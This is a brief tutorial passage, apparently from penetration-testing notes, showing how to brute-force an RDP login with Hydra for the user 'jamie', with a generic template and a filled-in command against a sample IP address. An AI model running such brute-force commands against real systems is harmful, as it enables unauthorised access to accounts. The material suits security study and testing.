Let's say we suspect that the username `Jamie` has a password that consists of 6 to 8 characters, including lowercase characters, uppercase characters and numbers. We can use `Hydra` to attack precisely attack this:

```sh
hydra -l <username> -x <min_characters>:<maximum characters>:<character_set> <IP> rdp
```

### Example Command:

```sh
hydra -l jamie -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 172.132.12.1 rdp
```